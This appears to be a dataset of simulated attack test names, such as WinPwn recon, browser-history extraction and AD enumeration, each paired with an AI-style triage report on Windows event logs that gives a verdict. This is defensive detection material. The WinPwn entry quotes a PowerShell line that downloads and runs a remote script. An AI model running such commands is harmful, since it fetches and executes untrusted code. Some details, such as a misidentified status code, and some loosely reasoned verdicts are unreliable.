**Application Log:**

- The Application log shows Windows Defender is active, reinforcing that real-time protection is engaged.

### Assessment:

Given the information from these logs, there is evidence of repetitive PowerShell script execution and multiple credential validation errors. These elements do not confirm malicious activity but do warrant further scrutiny to be prudent, especially inspecting the script execution context and ensuring no unauthorized automation is happening.

- **Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Verify Script Legitimacy:** Confirm whether the PowerShell script execution was sanctioned by an administrator or an automated maintenance task.
  
2. **Credential Validation Investigation:** The repeated credential validation errors should be reviewed to ascertain the context of the attempted access and verify no credentials have been compromised or misconfigured.
   
3. **Conduct Host Forensic Analysis:** Ensure comprehensive forensic analysis of the host to rule out any implants or deviations from the baseline configuration, especially verifying no persistence mechanisms involve unauthorized scripts.

4. **Monitor Further Activities:** Continuous monitoring should be implemented to capture any anomalies or further executions, to quickly respond if this indicates a precursor to an attack."
WinPwn - GeneralRecon,"### Detailed Analysis

Upon examining the Windows event logs provided, several activities stand out as potentially suspicious and warrant further investigation:

1. **Frequent Execution of wevtutil.exe and conhost.exe:**
   - The logs show multiple instances of `wevtutil.exe` and `conhost.exe` being executed within a short timeframe by the user `SERVER002\admin_test`. While both executables are legitimate Windows components, frequent and consecutive instances might suggest attempts to manage or manipulate event logs or console outputs without clear context.

2. **PowerShell Activity:**
   - The most alarming activity is seen in the logs detailing PowerShell execution. A PowerShell command is executed with the command:  
     `""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), Generalrecon -consoleoutput -noninteractive}`.
   - This command uses `IEX(New-Object Net.WebClient).DownloadString()`, which is a known technique used by attackers to download and execute scripts from an external URL. This particular behavior is indicative of malware activity or unauthorized scripts being run in the environment.

3. **Command Execution and Audit Concern:**
   - The execution of `whoami.exe` aligns with potential post-exploitation activities where an attacker might check the current user context.
   - HOSTNAME.EXE being run doesn't seem necessarily malicious in itself, but considering its context within the flow of activities, it should be examined if it was run legitimately or not.

4. **Edge Update and Installations:**
   - Processes related to Microsoft Edge are logged, including updates and installations. This can either be benign as part of a regular update cycle, or suspicious if it coincides with anomalous activities without expected admin intervention or scheduled updates.

### Assessment and Recommendations

- **Resolution: MALICIOUS**: Based on the evidence presented, particularly the PowerShell script download and execution from an external source, the logs suggest indicator of compromise in the environment.
- **Immediate Actions:**
  - **Isolation:** Consider isolating the affected host from the network to prevent further immediate exploitation or data exfiltration.
  - **Forensic Investigation:** A deeper forensic analysis is recommended to trace the source and scope of access, starting with the review of the downloaded script content and any changes it may have enacted on the system.
  - **Conduct User Verification:** Validate if `SERVER002\admin_test` actions were authorized by the IT team or look into potential credential misuse.
  - **Network Sweep:** Investigate other machines in the network for similar activities or IOCs (Indicators of Compromise) to ensure containment.
  
- **Long-Term Security Enhancements:**
  - **Enhance Monitoring and Alerts:** Consider implementing advanced analytics to detect unusual PowerShell activities.
  - **User Training:** Reinforce user awareness training on phishing and suspicious downloads, alongside enforcing stronger credentials policies.
  - **Patch Management:** Regularly audit and ensure timely patches and updates to all systems to mitigate known vulnerabilities."
Permission Groups Discovery PowerShell (Domain),"## Analysis of Logs

### Sysmon Logs:
1. **Process Execution:** Majority of the processes executed (e.g., `whoami.exe`, `conhost.exe`, `hostname.exe`, `powershell.exe`) are common utilities for user identity or system functions.
2. **PowerShell Execution:** The presence of a PowerShell command (`get-ADPrincipalGroupMembership`) suggests querying Active Directory for information about group membership. This suggests either an admin task or potential reconnaissance activity.
3. **Edge Update Activities:** Multiple entries refer to `MicrosoftEdgeUpdate.exe` and associated processes, indicating regular update activities for Microsoft Edge.
4. **Execution Context:** All processes are executed by `SERVER002\admin_test` with administrative privileges or `NT AUTHORITY\SYSTEM`, which suggests an elevated context typical for admin tasks or system updates.

### PowerShell Logs:
1. **PowerShell Activity**: The command `get-ADPrincipalGroupMembership $env:USERNAME` does not inherently indicate malicious activity. However, if executed without context, it could be part of unauthorized information gathering.

### Application Logs:
1. **Service Entries:** Entries related to `edgeupdate` stopping suggest regular service management and do not directly indicate malicious behavior.
  
### System and Security Logs:
- Logs contain typical Windows time service updates, with no suspicious entries or explicit security entries recorded in this context.

## Conclusion:
The events logged revolve around system administration tasks, regular applications, and system maintenance operations. While the PowerShell command line execution suggests possible elevated privilege usage, without further indications of misuse or evidence of unauthorized exfiltration or modification, the activity aligns more with benign administrative tasks. The presence of Edge update processes strongly indicates routine system maintenance and update activities by Microsoft software.

## Resolution:
**BENIGN** – The logs do not contain evidence of confirmed malicious activity but reflect typical system operations and administrative activities. No immediate threats or risks are identified from the provided logs.

### Guidance:
- Maintain regular monitoring for any deviations or unauthorized attempts which could pivot these benign tasks into sensitive recon-related practices.
- Confirm the legitimacy of scheduled tasks and administrative activities, particularly involving Active Directory interactions, to ensure conformity with security policies."
Remote System Discovery - net group Domain Computers,"After analyzing the provided Windows event logs, here is a detailed assessment:

1. **System Log Analysis**:
   - There is a time change noted (`EventID: 1`) where the system time is adjusted. Time adjustments are typical; however, frequent or unauthorized time changes can sometimes be indicative of attempts to mislead forensic investigations.
   - Windows Update activity is logged (EventID: 44, 43, 19), indicating regular updates for Windows Defender have been applied. This is standard system behavior and not inherently suspicious.

2. **Application Log Analysis**:
   - The only event shows Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This is a good indicator that antivirus protection is running.

3. **Sysmon Log Analysis**:
   - There are several executions of `whoami.exe` and `hostname.exe`, these are typically benign as they are often used to gather basic system information.
   - Execution of `net group ""Domain Computers"" /domain` is noteworthy. While this can be a common administrative task, if executed unexpectedly or excessively, it may signal suspicious user behavior or enumeration attempts.
   - Multiple executions of `wevtutil.exe` are noted, which may be used for tasks related to event logs. Regular usage by administrators is typical, but unexpected executions should be reviewed to ensure they align with known activities.
   - `wuauclt.exe` and `AM_Delta.exe` processes, related to Windows updates, appear normal.

4. **Security Log Analysis**:
   - `EventID: 4624` and `4672` indicate successful logons with elevated privileges involving the user `admin_test`. The elevated privileges include debug privileges (`SeDebugPrivilege`), which are sensitive as they allow process manipulation. It’s essential to verify if this level of access is justified.
   - Attempts using NTLM authentication from IP `192.168.0.102`. Ensure this remote activity was expected.
   - Event `5379` shows failed access attempts to services/non-existent resources, which could be a result of misconfigurations or benign recon activities.

**Conclusion and Resolution**:
- **Identified Behaviors**:
  - The invocation of `net group` command and the presence of elevated privileges are activities to be aware of. 
  - While `whoami` and related commands can be non-threatening, they can also serve for reconnaissance in preparation for further malicious actions.
  - Multiple login sessions and the use of scripts or commands that interact deeply with systems (e.g., `cmd.exe`, `wevtutil.exe`) should be vetted for legitimacy.

The evidence does not unequivocally prove malicious activity but indicates behaviors that warrant further scrutiny. Therefore, the resolution for these logs is **SUSPICIOUS** as activity that doesn’t look right and needs more investigation.

**Guidance**:
- Review user roles and permissions to confirm if `admin_test` actions were authorized.
- Investigate the origin and context around the `net group` command execution.
- Monitor for continued or new occurrences of similar flagged activities.
- Ensure all the machines involved are updated and protected by active threat detection mechanisms."
Extract chrome Browsing History,"To assess the provided logs for indicators of malicious activity, we need to methodically evaluate each log entry for signs of unusual behavior, such as unauthorized process execution, use of high privilege accounts for suspicious tasks, and any signs of known malicious activity.

### Analysis

1. **Sysmon Logs:**
    - **Microsoft Edge Update Activity:** 
      - There are multiple entries regarding the execution of Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) under the `NT AUTHORITY\SYSTEM` account. This behavior is typical for software update activities, not inherently suspicious unless unexpected or outside known update windows. The presence of both `MicrosoftEdgeUpdate.exe` and its companion processes (`setup.exe`) within expected directories and under the SYSTEM account could indicate normal update behavior.
    - **Wevtutil and Conhost Activity:**
      - The usage of `wevtutil.exe` and `conhost.exe` executed by the `admin_test` account might suggest interactive logon activity. While `wevtutil` is used for managing event logs, its execution pattern shows repeated calls within a short timespan, which might be benign in a scripted or maintenance context, but could warrant further investigation.
    - **Whoami and Hostname Activity:**
      - Execution of `whoami.exe` and `hostname.exe` could be part of routine administrative checks or scripts, confirming the environment's identity attributes (username, host, etc.). Without context, these are benign.

2. **PowerShell Logs:**
    - The PowerShell script records appear to be  executing a command to extract the user's Chrome browsing history and save it to a local file. This behavior could indicate a potential data gathering operation, potentially malicious if not sanctioned or expected as part of administrative tasks. The script executes PowerShell commands to parse user history, which is a potential red flag.

3. **Security Logs:**
    - Show changes in system time, likely due to time synchronization (NTP). Such activity is typically benign, aligning with automated time service adjustments.

4. **System Logs:**
    - Reflect typical system operations related to time synchronization (`svchost.exe`). No anomalies detected.

5. **Application Logs:**
    - Indicates a stop event for `edgeupdate`. As part of typical application lifecycle, stopping a service when it completes its task is not unusual.

### Assessment
While there are numerous Edge Update activities, they align with what could be expected during legitimate update processes. However, the PowerShell script execution raises flags due to its purpose of extracting browsing history — a potential privacy concern and indicating possible insider threat behavior or an indicator of compromise if unauthorized.

### Resolution
- **SUSPICIOUS:** The presence of a PowerShell script collecting user browsing history demands a closer inspection. While other entries largely align with expected system behaviors, the potential for unauthorized data exfiltration via PowerShell is significant enough to warrant further investigation.
  
### Actions
1. Verify if the PowerShell actions were authorized by a legitimate administrator or user action.
2. Investigate the context of the `wevtutil` executions to ensure they were part of routine tasks.
3. Check system update activities for Edge against official update schedules.
4. Implement monitoring for excessive or unusual PowerShell script executions going forward."

1. **Security Logs**:
   - The security events primarily involve adjustments to the system time, as seen with Event IDs 4616 and involve the process `svchost.exe` which is typical for system services. The time changes do not seem out of the ordinary and appear to be part of normal system operations.

2. **Application Logs**:
   - The application logs indicate routine activities related to the Software Protection Platform Service and Edge Update Service. There are two event entries for the Edge Update service being stopped, which could be indicative of normal update processes.

3. **System Logs**:
   - The system logs consist of kernel and time service events that appear to reflect normal system operations. There are no red flags regarding privilege escalations or unusual process start-ups.

4. **Sysmon Logs**:
   - The Sysmon logs contain multiple entries for process creation and termination involving `edgeupdate`, `cmd.exe`, and `whoami.exe`:
      - The activities involving `edgeupdate` are consistent with an update process for the Microsoft Edge browser. This includes processes like `MicrosoftEdgeUpdate.exe`. These are expected during software update cycles.
      - The command `cmd.exe` running `aws ec2 describe-security-groups` suggests a possible script or administrative task to retrieve information from AWS, which could be part of normal operations assuming the use of AWS services is authorized in the environment.
      - The use of `whoami.exe` could be part of a script checking the current user's identity or permissions but does not immediately indicate malicious activity.

5. **General Observations**:
   - No evidence of privilege escalation or anomalous command-line arguments, which might indicate malicious activity, is present.
   - No presence of unusual or suspicious hashes associated with known malware.
   - Log entries related to services, sysmon, and kernel operations suggest routine maintenance and updates.
  
**Conclusion**:
Based on the review of the provided log entries, there are no definitive indicators of malicious activity present. The activities observed are consistent with a typical update operation and script execution that do not inherently imply a compromise.

**Resolution**: BENIGN - The logs contain benign activity. There are no immediate actions required. However, it is always good practice to ensure that any usage of AWS operations is in line with the organization's policies and that accounts executing these scripts have appropriate authorizations."
Check computer location,"Upon reviewing the provided Windows event logs, here's the detailed analysis and assessment:

### Analysis:
#### Security Logs:
- The `Security` logs primarily indicate time change events (EventID 4616). The Time being changed twice in quick succession by the `svchost.exe` process running under the `LOCAL SERVICE` account is noted. The time changes themselves measure in milliseconds which is typically not indicative of a manipulation attempt; rather it falls under normal behavior when time synchronization occurs with an NTP server.

#### Sysmon Logs:
- Numerous instances of `wevtutil.exe` and `conhost.exe` processes are executed by `admin_test` on `SERVER002`. These are legitimate system processes, typically invoked during normal operations like logging or console window management.
- The execution of `hostname.exe`, `cmd.exe`, `whoami.exe`, and `reg.exe` commands by `admin_test` is documented. This activity suggests system enumeration routines, which can be legitimate during administrative tasks or indicative if found in context of a potential cyber reconnaissance activity.
- A significant portion of logs involves `MicrosoftEdgeUpdate.exe` and related processes executed by `NT AUTHORITY\SYSTEM`. These seem to be routine update or installation procedures of Microsoft Edge, as evidenced by versioning and associated commands like `/update`, `/svc`, `/ping`, etc.

#### System Logs:
- The system logs show similar time change events as the security logs, without any indication or anomaly beyond synchronization with an NTP server (`time.windows.com`).

#### Application Logs:
- Logs indicate operations by `Software Protection Platform Service` and `edgeupdate`, typical of system maintenance tasks. These logs declare service stop events, likely related to Edge update cycles.

### Assessment:
- The observed time change events are normal for systems with automatic clock synchronization enabled, triggered by NTP synchronization.
- The sequence of running `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` is consistent with administrative or diagnostic activity. These tools do not, on their own, indicate malicious intent.
- The numerous invocations of `MicrosoftEdgeUpdate.exe`, alongside its activities suggest regular software update processes. The details provided (e.g., file version, command-line arguments) match known legitimate activities for software maintenance.

### Resolution:
- **BENIGN**: The logs show no irrefutable or direct evidence of malicious activity. They reflect expected behavior concerning system updates and time synchronization, inline with legitimate administrative operations and regular software maintenance tasks.

### Guidance:
- Keep abreast of logging best practices and ensure proper log review processes are in place to catch deviations promptly.
- Continuously educate administrative users on identifying potential misuse or unusual activity patterns, which may accompany seemingly legitimate operations.
- Maintain regular audits on systems, including time synchronization settings and update management processes, to verify authenticity and integrity."
System Time Discovery,"Based on the provided Windows event logs, the following analysis can be made:

1. **System Log**: 
   - The system logs indicate a routine update process for Microsoft Defender Antivirus, which is a benign activity.

2. **Time Synchronization Events**: 
   - Multiple entries related to time synchronization are seen in the system logs and they appear normal. This could be expected behavior as the Windows Time Service adjusts the system clock using time.windows.com.

3. **Application Log**: 
   - The entries from the `edgeupdate` service stopping followed by restarting are expected behaviors in normal operations when Microsoft Edge updates itself or integrates updates.

4. **Security Log**:
   - The security logs show events related to time changes, which align with the system logs' time synchronization activities. There are no indications of privilege escalation or unauthorized access attempts.

5. **Sysmon Log**: 
   - Several instances of standard system utilities (e.g., `whoami.exe`, `conhost.exe`, `cmd.exe`, `net.exe`, `w32tm.exe`) are observed. These appear to be executing valid system commands related to system information and time-checking/synchronization.
   - Microsoft Edge Update processes observed in the Sysmon log reflect expected behaviors and command-line arguments for typical Edge updates, without signs of tampering or malicious commands.

6. **Potentially Interesting Activities**: 
   - The `cmd.exe` usage for obtaining time through `net time` and `w32tm /tz` suggests that some script or administrative task is querying time configuration, which is not inherently suspicious unless there's evidence of subsequent malicious behavior, which is not present in these logs.

Given the analysis of the logs:
- No signs of malicious activity or compromise have been detected.
- All observed activities match typical administrative or update behaviors.

**Resolution**: **BENIGN** - The logs contain benign activity. No further investigation is warranted based on the provided entries. However, continuous monitoring remains beneficial to detect any unexpected changes in behavior patterns."
Enumerate Active Directory Groups with ADSISearcher,"### Log Analysis:

From the examination of the provided logs, the following observations can be made:

1. **Sysmon Log Analysis:**
   - **Process Execution and Command-Line Arguments:**
     - Multiple legitimate Windows binaries like `HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`, and `powershell.exe` are executed by the user `SERVER002\admin_test`.
     - `powershell.exe` is executed with the command `powershell.exe & {([script]\""objectcategory=group\"").FindAll(); ([script]\""objectcategory=group\"").FindOne()}`. This usage of PowerShell seems to attempt to query for user groups which might indicate reconnaissance activities.
   - **Integrity Levels:**
     - All processes are executed with a High Integrity Level which implies they have elevated privileges.
   
2. **Security Log Analysis:**
   - **Event ID 4616** indicates a system time change, which could be an attempt to manipulate timestamps, potentially to hide other nefarious activities. This action executed by `LOCAL SERVICE` using `svchost.exe` is typically benign, but if manipulated, could be leveraged for malicious intent.

3. **Application Log Analysis:**
   - The Application log contains normal activities related to the Software Protection Platform Service, which is not immediately concerning.

4. **System Log Analysis:**
   - **Time Change Events:**
     - The Kernel-General events confirm multiple small adjustments to the system time which might be standard behavior, yet coupled with suspicious activities, it might warrant closer inspection.

5. **Windows PowerShell Log Analysis:**
   - Shows evidence of the execution of PowerShell scripts which align with the `Sysmon` logs. This execution does not immediately indicate malicious intent but can be used in attacks for reconnaissance.

### Assessment:

- **Suspicious Activity:**
  - The usage of PowerShell with a high integrity level to execute scripts aimed at gathering group information might indicate a reconnaissance phase of an attack.
  - The `wevtutil.exe` process was noted several times. While `wevtutil` can be used for legitimate purposes, it can also be used maliciously to clear event logs or export logs, which is a common approach in post-exploitation scenarios to cover tracks.

- **Time Adjustment:**
  - Although minor, the system time changes could potentially be used in a malicious campaign to obfuscate actions or logs.

### Conclusion:

The events logged in the provided samples do not definitively prove malicious activity but are **suspicious** in nature, largely due to the usage of PowerShell which is involved in scripting to query for groups, coupled with minor system time changes which could be used to cover tracks or manipulate logging history. Further investigation is warranted to ensure that these activities are not part of a larger attack strategy or the reconnaissance phase of a malicious campaign.

**Resolution**: SUSPICIOUS

### Recommended Actions:

1. **Conduct a Deeper Investigation:**
   - Trace user `SERVER002\admin_test` activities in other logs to establish a pattern that might indicate misuse or compromise.
   - Verify the commands executed through `PowerShell` for legitimacy.
   - Conduct a review of recent system changes and user activities, focusing on possible privilege escalations or unauthorized access attempts.

2. **Cross-Verify with Threat Intelligence:**
   - Check for known indicators of compromise related to suspicious command-line usage.

3. **Implement Monitoring:**
   - Increase monitoring on the use of `PowerShell` scripts and `wevtutil.exe`.
   - Setup alerts for unexpected system time changes to capture potential malicious behaviors.

4. **Security Awareness:**
   - Remind users about the implications of executing scripts with elevated privileges and guide them on identifying potential phishing attempts that encourage such activities."
Enumerate Active Directory Groups with Get-AdGroup,"### Detailed Analysis:

#### PowerShell Log:
- The logs primarily involve the initialization and stopping of PowerShell with the command `Get-AdGroup -Filter *`. This command is used to retrieve all Active Directory groups which is routine if part of an audit or management script.
- No suspicious or unfamiliar command line arguments or scripts are being executed in the PowerShell log.

#### Sysmon Log:
- The logs indicate multiple executions of `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `HOSTNAME.EXE`, WhOAMI.EXE, and PowerShell by the user `SERVER002\admin_test`. 
- Usage of `wevtutil.exe` in a repeated pattern might be suspicious but often it can be leveraged for event management, especially logging or clearing logs.
- Processes such as `MicrosoftEdgeUpdate.exe` are also initiated several times, which is typical for updating software like browsers.
- There is nothing overtly malicious about these entries without additional context suggesting these commands were unexpected.

#### Application Log:
- The logs highlight normal operation services stopping, like `edgeupdate`, which is part of the regular update function and should not be inherently considered suspicious.

#### System Log:
- Time changes indicate possible time synchronization issues. The timestamps indicate backward time jumps which could suggest either clock skew or changes made by services such as `svchost.exe` acting as a host process for Windows services.

#### Security Log:
- Contains logs of user `admin_test` performing high privilege tasks (log type `3`) using NTLM authentication from a workstation `DESKTOP-3HL5B2P`.
- Privileges listed have high access rights for security, backup, restoration, and debugging, though this is normal for administrative functions.

### Assessment:
Based on the detailed review of event logs, no conclusive evidence points to malicious activity. The entries indicate routine administrative and system updates (e.g., PowerShell commands querying Active Directory, Microsoft Edge updater activities). However, the use of certain utilities like `wevtutil.exe` and the alteration of system time merit further scrutiny to confirm context.

### Conclusion:
**Resolution: SUSPICIOUS** 

The identified activities do not explicitly indicate a compromise but exhibit a few patterns that might warrant deeper investigation, especially concerning the recurrent use of `wevtutil.exe` and time adjustments. Further action involves ensuring these operations were part of normal administrative duties, and checking if these times and activities correlate with expected tasks by `admin_test`."
Remote Desktop Services Discovery via PowerShell,"Based on the provided logs, I've conducted an analysis focusing on the potential indicators of malicious activity. Below is the detailed analysis report highlighting the suspicious or anomalous behavior found in the logs:

1. **Time Changes in System Logs:**
   - In the System log, there are entries indicating changes in system time (EventID 24 and EventID 1) executed by `svchost.exe`. This is seen in two consecutive entries where old time is adjusted to a new time. Frequent or unauthorized time changes could potentially be used to bypass time-based security controls or cover tracks. However, without further context, it could also be normal system behavior. The system time adjustment source is `time.windows.com`, which is standard.

2. **Process Execution - Sysmon Logs:**
   - Various instances of processes like `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows tool, but could be used by attackers to clear event logs. Multiple executions of these processes could warrant further scrutiny, particularly if they did not originate from legitimate administrative activities.
   - The execution of `hostname.exe`, `whoami.exe`, and PowerShell also by `admin_test`, can be benign as these are diagnostic tools, possibly used during administrative tasks. PowerShell was used with `Get-Service` command for `Remote Desktop Services`, which can be part of regular system administration.

3. **Use of Privileged Accounts - Security Logs:**
   - A notable event is a user `admin_test` having high privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which indicate admin-level access was granted. This is significant when evaluating if the activities observed are expected for this account.
   - Several logon sessions using NTLM authentication from an external workstation `DESKTOP-3HL5B2P` indicate remote network access. These logons appear normal for remote access but should be verified for authenticity.

4. **Updates and Installer Executions - Sysmon Logs:**
   - The Sysmon logs show evidence of Microsoft Edge update processes executing. This includes a setup process with command-line flags for update installation. The presence of these processes and their execution appear consistent with legitimate software updates.

5. **PowerShell Activity - PowerShell Logs:**
   - Logs show executed PowerShell with commands to query Remote Desktop Services. This could be routine administrative monitoring but should be cross-verified with expected task schedules or executed batch processes for credibility.

### Assessment and Resolution:

- The time changes in the system log are unusual but may not indicate direct malicious intent without additional corroborating evidence.
- The execution of `wevtutil.exe` and `conhost.exe` repeatedly by `admin_test`, when considered with account privileges, seems atypical and deserves a closer look.
- Remote logon sessions should be verified to ensure authentication follows expected patterns, especially when privileges are involved.

**Resolution: SUSPICIOUS**

The combination of unusual time adjustments, high privilege usage by `admin_test`, and repeated execution of system utilities like `wevtutil.exe` are potentially suspicious. This activity requires further investigation to ensure that `admin_test` accounts and its associated activities are valid and harmless. Further steps should include verifying `admin_test` account's recent activities, any related task schedules, software updates, and network traffic analysis around time-stamped events."
Port Scan using python,"**Analysis of the Windows Event Logs:**

1. **Windows PowerShell Log:**
   - **EventRecordID: 1066**: Displays the use of PowerShell to download an executable from an external URL (https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe) and execute it quietly. The use of Invoke-WebRequest and Start-Process with a ""/quiet"" parameter can indicate attempts to perform actions without user intervention, which is a method commonly used by adversaries to install malicious payloads without detection.
   - **EventRecordIDs: 1067-1074**: Involves running a Python script located in a temporary directory with input from `127.0.0.1`, which could be indicative of some local testing or development work, yet the context remains unclear.

2. **Security Log:**
   - **EventID: 4798 and 4799**: These events are related to querying for the group memberships of user accounts, initiated by `CompatTelRunner.exe`. This behavior can be typical for system level auditing processes or legitimate telemetry, but remains potentially suspicious if abnormal for this environment or if CompatTelRunner has been compromised.
   - **EventID: 4624 and 4672**: These events suggest a successful logon using system privileges, which is common for administrative tasks but should be reviewed for authorized activity.

3. **System Log:**
   - Shows routine Windows Update client actions without indicators of compromise.

4. **Sysmon Log:**
   - **Process Execution**: The installation of Python-related executables in temporary directories by a user ""admin_test"" is informed by the logs. This raises concerns if the installation wasn't sanctioned or expected. The presence of command-line arguments to run a local script using Python from the temporary directory should be inspected.
   - **CompatTelRunner.exe Activity**: The process was used to query user group memberships and conduct telemetry activities, consistent with potential misuse or alteration of the component.

**Assessment:**
- **Suspicious Activity**: The downloading and quiet execution of external executables via PowerShell and the use of temporary directories raise concerns about potentially unauthorized actions or the intentions behind these operations. The sophistication of the executed commands and consistency with stealthy operations suggest the necessity for deeper scrutiny.

**Resolution:**
- **SUSPICIOUS**: The identified activities necessitate further investigation to understand the context of the installation and the legitimacy of running Python scripts locally, alongside verifying if the use of `CompatTelRunner.exe` aligns with expected system behavior.

**Guidance:**
- Conduct an in-depth inspection of the involved user accounts and verify any authorized operations around the use of PowerShell and Python across the environment.
- Check the integrity and origin of the `python_setup.exe` and any related installations.
- Review correlating logs, especially for unusual network connections or scheduled tasks potentially set by the PowerShell activities.
- Secure the system by ensuring it is patched and that antivirus signatures are up to date, while monitoring for subsequent anomalies.

This structured approach ensures potential threats are thoroughly investigated to safeguard the system against compromises."
Windows Internal Packet Capture,"Based on the provided log entries, here is my detailed analysis:

**Application Log:**
- The log entry shows activity by the ""Software Protection Platform Service"" provider. The timestamp and the nature of the entry do not indicate any immediate cause for concern. This type of log generally pertains to licensing and protection status updates, which are routine.

**Sysmon Log:**
- Multiple process creations have been recorded with `wevtutil.exe`, `conhost.exe`, `hostnamed.exe`, `whoami.exe`, and `netsh.exe`. These are legitimate Windows processes, often used for administrative purposes.
- There is a notable usage of `cmd.exe` executing a command with `netsh trace start`. This could be used for legitimate network troubleshooting but can also be used maliciously to capture network traffic.
- The usage of `whoami.exe` and querying of system details (`hostnamed.exe`) could imply reconnaissance activities. However, they are being run by an administrative user ('SERVER002\\admin_test'), which aligns with legitimate administrative actions if executed knowingly.
- There is no definitive sign of privilege escalation or unusual command-line arguments that are overtly suspicious without additional context.

**System Log:**
- The logs show an adjustment of the system time. While this can be a normal activity, it could also be used to manipulate logs or system actions. The adjustment does not have obvious ties to malicious actions in these logs.

**Security Log:**
- The logs show a successful logon event (`EventID: 4624`) with logon type 5, which is a service startup. It is consistent with automatic processes starting on the system.
- The `EventID: 4672` indicating high privileges assigned does not show any unauthorized privilege assignment as it is consistent with SYSTEM user execution.

**Windows PowerShell Log:**
- There are no entries provided here, which limits the analysis concerning script-based activities.

**Assessment:**
- The logs predominantly reflect the actions of a user 'admin_test' on the computer 'Server002'. The activities logged like utilization of 'wevtutil', 'whoami', and 'netsh' might suggest system or network analysis being conducted by someone with administrative intent.
- The absence of any direct indicators of malicious payload delivery, exploit attempts, or command executions that grossly misalign with typical administrative tasks leads this investigation toward a cautious conclusion.

**Resolution: SUSPICIOUS**

The observed activities, while not inherently malicious, contain elements warranting further examination—particularly the `netsh` command usage. Confirm the legitimacy of these actions and validate with the administrative user if these tasks align with regular operations. Additional scrutiny on user 'admin_test' activities, especially file integrity verification and examining user credentials/access, is advisable to rule out any potential misuse."
List Process Main Windows - C# .NET,"Based on the provided logs, I have conducted a detailed analysis to determine any indicators of malicious activity.

### Analysis:

1. **Security Logs:**
   - Event IDs 5379 indicate Credential Read operations. The logged return code `3221226021` suggests a failed operation due to ""STATUS_LOGON_FAILURE"".
   - This could indicate potential information gathering on user accounts or additional attempts to gain access, but in isolation, these do not indicate definitive malicious activity.

2. **Sysmon Logs:**
   - **PowerShell Execution**: There's a PowerShell process initiated by the user `SERVER002\admin_test`. PowerShell can be used both administratively and maliciously. Given no further context on the script or commands run, this cannot be classified as definitively malicious.
   - **Eventing Command Line (wevtutil.exe)**: Multiple instances of `wevtutil.exe` captured, including an ""Export Log"" command (`epl`). This can be a sign of data exfiltration or log tampering efforts. However, without further context or additional suspicious activities preceding or following this action, this could also be a benign administrative task.
   - **Process Creation - .NET Compilations:** The sequence involving compilation (`csc.exe` and `cvtres.exe`) and execution (`data.exe`) of a .NET application in the Temp directory is suspicious. Such behavior might suggest the execution of potentially harmful code due to the typical misuse of temporary directories for executing malicious scripts or binaries.
   - **Command Execution:** A `cmd.exe` process executing commands to compile a C# script into an executable and subsequently run it is another red flag. This behavior suggests potential unauthorized code execution and should be closely scrutinized.
   
3. **System Logs:**
   - Windows Update and Defender Update logs indicate regular updates which are benign and expected behavior for the system's normal operations.

4. **Other Findings:**
   - The log entries show instances where high-integrity level processes like `wuauclt.exe` (Windows Update) and `MpSigStub.exe` (Defender update) are executed by `NT AUTHORITY\SYSTEM`, which indicates legitimate system update activities.

### Conclusion:
- **Resolution: SUSPICIOUS**

The compilation and execution of a C# script from the Temp directory, combined with the repeated use of `wevtutil.exe` for log management, are activities that raise suspicion. The system authentication attempts and failed credential reads are activities that require further investigation to ensure no unauthorized access is being attempted.

### Guidance:
- **Immediate Actions:**
  - Conduct a more in-depth investigation of the context surrounding the PowerShell and `cmd.exe` executions. Retrieve associated scripts or binaries (`data.cs`, `data.exe`) and assess their content for potential threats.
  - Review user activities associated with `SERVER002\admin_test`, including recent changes to group memberships or logon events.
  - Examine network logs or endpoint defenses for any connections or alerts associated with data exfiltration or unauthorized access attempts.
- **Long-term Recommendations:**
  - Implement enhanced logging and monitoring of high-integrity level commands and executions, structure review processes for temporary directories.
  - Educate users on recognizing suspicious activities and ensure robust cybersecurity training.
- **Response Measures:**
  - If investigation confirms malicious activity, engage appropriate incident response protocols to contain and eradicate threats, followed by a post-incident review and hardening of systems and processes.

Further investigation is essential to determine the presence and extent of any compromised activities."
Powershell enumerate domains and forests,"Upon analyzing the provided event logs, several notable observations indicate potentially malicious activity:

1. **Use of PowerShell with Suspicious Script Execution**:
   - A PowerShell instance (`powershell.exe`) is started with a command containing modules and Active Directory enumeration commands such as `Get-NetDomainTrust`, `Get-NetForestTrust`, `Get-ADDomain`, `Get-ADGroupMember Administrators -Recursive`, etc. It suggests execution for reconnaissance or privilege enumeration, common in attack vectors that involve lateral movement or privilege escalation attempts.

2. **Processes Executed by `admin_test` Account**:
   - The user `SERVER002\admin_test` is observed running several processes such as `powershell.exe`, `wevtutil.exe`, `whoami.exe`, and `HOSTNAME.EXE`. 
   - The use of `wevtutil.exe` and `whoami.exe` alongside PowerShell can be indicative of potentially malicious behavior, often used to clear event logs or gather user context in attacks.

3. **Repeated Administrator Account Inspection**:
   - Multiple event logs (Event ID 4798) are recorded for querying information about user accounts including `Administrator`, `admin_test`, `DefaultAccount`, `Guest`, and others under suspicious contexts. This activity suggests scouting potentially for account details which is abnormal in routine operations.

4. **Execution with High Integrity Levels**:
   - The integrity level of the executed processes is marked as ""High,” indicating these processes hold elevated privileges, further suggesting the potential risk for high-severity system changes or data access.

5. **Event with Privileges Assigned to SYSTEM**:
   - Event ID 4672 shows privileges, potentially dangerous if compromised, including SeDebugPrivilege, SeTcbPrivilege, and others assigned to the `SYSTEM` user, emphasizing the risk if paired with unauthorized access.

### Conclusion:

Based on the analysis, the logs display patterns of reconnaissance activities, possible credential or access auditing, and system information gathering via command-line. These activities are flag worthy, often seen in pre-attack or ongoing attack phases in cybersecurity incidents. Importantly, the presence of PowerShell script execution aimed at domain enumeration aids in solidifying concerns regarding malicious intents.

**Resolution: MALICIOUS**

These logs reflect highly suspicious activities that strongly align with known tactics used by malicious actors. Immediate investigation and response are strongly recommended, including account review of `admin_test`, system scan, and activity trend monitoring.

### Guidance on Next Steps:

1. **Immediate Restriction**: Temporarily limit the `admin_test` account and investigate recent changes and access logs related to this user.
